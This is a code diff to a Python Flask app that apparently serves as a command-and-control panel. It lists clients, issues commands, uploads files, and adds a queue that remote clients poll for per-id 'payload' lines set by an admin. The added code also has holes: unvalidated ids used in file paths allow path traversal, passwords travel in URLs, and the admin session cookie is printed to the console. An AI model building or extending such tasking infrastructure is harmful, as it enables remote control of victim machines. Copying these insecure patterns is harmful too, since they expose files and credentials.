@@ -99,7 +99,7 @@ app = Flask(__name__)
 def my_form():
     return render_template("index.html")
 
-@app.route(f'/file_upload/{admin_password}', methods=['GET'])
+@app.route(f'/file_upload/{admin_token}', methods=['GET'])
 def upload_fil():
     if request.cookies.get("id"):
         global admin_cookie
@@ -220,6 +220,53 @@ def get_all():
     else:
         return render_template("interact.html",content="",error_code="Invalid Session, please sign in")
 
+@app.route("/queue/", methods=["GET"])
+def queue():
+    if request.args.get('id'):
+        id = request.args.get('id')
+        if request.args.get('action'):
+            try:
+                with open(f"./queue/{id}.txt",'r') as file:
+                    data = file.read()
+            except:
+                with open(f"./queue/{id}.txt",'w') as file:
+                    file.write("")
+            if request.args.get('action') == "fetch":
+                return data
+            else:
+                data = data.split("\n")
+                to_return = data.pop(0)
+                with open(f"./queue/{id}.txt",'w') as file:
+                    file.write('\n'.join(data))
+                return to_return
+        else:
+            return ""
+    else:
+        return ""
+
+@app.route(f'/edit_queue/{admin_token}',methods=["GET","POST"])
+def edit_queue():
+    if request.args.get("password"):
+        if request.args.get("password") != admin_password:
+            return render_template("edit_queue.html",error="Invalid Password")
+        if request.cookies.get("id"):
+            global admin_cookie
+            if request.cookies.get("id")!=admin_cookie:
+                return render_template("edit_queue.html",error="Invalid Cookie, please sign in")
+            if request.method == "GET":
+                return render_template("edit_queue.html",queue = glob.glob("./queue/*.*"))
+            elif request.method == "POST":
+                id = request.values.get('id')
+                payload = request.values.get('payload')
+                with open(f"./queue/{id}.txt",'w') as file:
+                    file.write(payload)
+                return render_template("edit_queue.html",error="Done !",queue = glob.glob("./queue/*.*"))
+        else:
+            return render_template("edit_queue.html",error="Invalid Cookie, please sign in")
+    else:
+        return render_template("edit_queue.html",error="Set a password.")
+
+
 @app.route("/account/",methods=["GET","POST"])
 def account():
     host1 = "0.0.0.0"
@@ -231,8 +278,9 @@ def account():
     command_p = f"http://{host1}/command/{admin_token}?password={admin_password}"
     client_p = f"http://{host1}/get_all_clients/{admin_token}?password={admin_password}"
     live_feedb = f"http://{host1}/feedback/{admin_token}?password={admin_password}"
-    file_upl = f'http://{host1}/file_upload/{admin_password}?password={admin_password}'
-    content = [(command_p,"Command Pannel :"),(client_p,"Client Pannel :"),(live_feedb,"Live feedback :"),(file_upl,"File Upload :")]
+    file_upl = f'http://{host1}/file_upload/{admin_token}?password={admin_password}'
+    edit = f'http://{host1}/edit_queue/{admin_token}?password={admin_password}'
+    content = [(command_p,"Command Pannel :"),(client_p,"Client Pannel :"),(live_feedb,"Live feedback :"),(file_upl,"File Upload :"),(edit,"Edit Queue :")]
     if fail_counter == 3:
         return render_template("admin.html",error_code=f"Acces Blocked, max attempts excelled.")
     if request.method == "POST":
@@ -244,6 +292,7 @@ def account():
             expire_date = expire_date + datetime.timedelta(hours=1)
             global admin_cookie
             admin_cookie = hash(admin_hash,user)+Suggested_pass(5,5,-1).generate()
+            print(admin_cookie)
             res = make_response(render_template("links.html",content=content))
             res.set_cookie('id', admin_cookie, expires=expire_date)
             return res
